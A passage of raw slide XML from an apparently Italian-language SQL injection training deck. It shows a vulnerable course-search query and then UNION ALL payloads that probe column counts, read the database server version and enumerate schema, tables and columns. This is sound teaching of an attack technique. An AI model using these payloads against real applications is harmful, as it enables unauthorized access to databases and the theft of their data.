              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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' ORDER BY 1--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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44988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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{535E5766-50FF-2563-3F1C-B40E98FE1B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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B816575F-A1F2-CC02-BE8B-F2A223969B1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0150" y="1454970"/>
            <a:ext cx="65637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SQL Injection #2: UNION ALL</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F0D6E018-3A96-D35E-46AD-18E07D795DBF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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{853F1DCA-31FB-0F18-B2F3-CBB8776A9E72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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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' UNION ALL SELECT NULL, 'a', NULL, NULL, NULL, NULL ORDER BY 2--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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66001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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9D62413F-EA1C-54C4-E025-71445E9639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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B3888C5D-BAF9-437A-AFEC-0534699BC1A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0150" y="1454970"/>
            <a:ext cx="65637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SQL Injection #2: UNION ALL</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2F29C4C6-2E4B-5C23-FB9C-35592599654F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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BE3EA41C-F190-75C0-9BF2-EDD19899950A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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> AND Title LIKE '%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' </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:b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UNION ALL </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:b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SELECT NULL, 'a', NULL, NULL, NULL, NULL</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:b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ORDER BY 2</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:b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--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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23763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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9358444C-7853-BF1F-D289-4002436125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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AA0CBDAF-CF33-1CBD-CDB9-6916F8412B2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0150" y="1454970"/>
            <a:ext cx="65637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Recuperare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>versione</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> del database server*</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{69E4E2DF-793D-756F-EB84-A4C93546FDA5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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{575B8E52-58D8-605A-41E3-FE9D8F667FE8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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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' UNION ALL SELECT NULL, @@VERSION, NULL, NULL, NULL, NULL ORDER BY 2--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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08615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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BA83D64F-17F5-E9D6-41B9-FA15B1CECE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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{895BD0FD-4C79-1774-8867-3624FB85B59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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Recuperare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>versione</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> del database server**</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1E02F20C-6A13-65F6-8385-77A7E5DFBDFC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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B5968E61-690C-1F5F-7CE1-A222F3C4A254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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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' UNION ALL SELECT NULL, VERSION(), NULL, NULL, NULL, NULL ORDER BY 2--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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20002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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EFF40531-5418-D238-DA56-5FBD9EE743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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{67786EA0-FB50-F4E4-40B4-ED11F90D9FB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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Recuperare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>struttura</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> del database*</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A85D4787-33B1-E75D-99CB-1D54A1200C5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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{32A16D06-AE54-6BF4-ADE9-45C93D634A35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441500" y="2123627"/>
            <a:ext cx="6261000" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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' UNION ALL SELECT NULL, CONCAT(S.name, '.', T.name, '.', C.name), NULL, NULL, NULL, NULL FROM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sys.columns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 C INNER JOIN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sys.tables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 T ON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T.object_id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 =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C.object_id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 INNER JOIN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sys.schemas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 S ON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S.schema_id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 =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T.schema_id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 ORDER BY 2--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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66151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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{29F90C1E-D30E-F4C0-A1D8-B6F600621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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3093E38A-769C-ABEC-65B9-0739E426C35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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Recuperare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>struttura</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> del database**</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{51444B20-591C-53CF-56FB-30B446DF993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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A2401073-FB78-3332-A168-2AFD1937588B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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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' UNION ALL SELECT NULL, CONCAT(C.TABLE_SCHEMA, '.', C.TABLE_NAME, '.', C.COLUMN_NAME), NULL, NULL, NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS C WHERE C.TABLE_SCHEMA &lt;&gt; N'INFORMATION_SCHEMA' ORDER BY C.TABLE_NAME, C.ORDINAL_POSITION</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:b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 ORDER BY 2--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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03585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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4361B430-5B6A-C8D7-8A70-FFCAC48A7A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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C202F62D-4E1A-92ED-8345-1E40DDE88C7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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Recuperare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>struttura</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> del database</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3B9BD06F-8ADA-8BDC-CD8E-740CE39B1F12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6500" y="448013"/>
            <a:ext cx="911000" cy="91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C949810-8240-554C-A042-21CCCBF25B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66890" y="1883207"/>
            <a:ext cx="1410219" cy="270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75389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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C1BFF0C3-3F74-F29F-3C84-30C80F33B5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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4BCE8877-1789-401D-4C57-89BD6D1AEAE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0150" y="1454970"/>
            <a:ext cx="65637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Recuperare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> il </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>contenuto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> di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tabella</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9BDA5062-7C55-0620-9D10-A9A5014DEBA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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9F8B238D-F1EE-13CD-4106-2743006F5D36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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
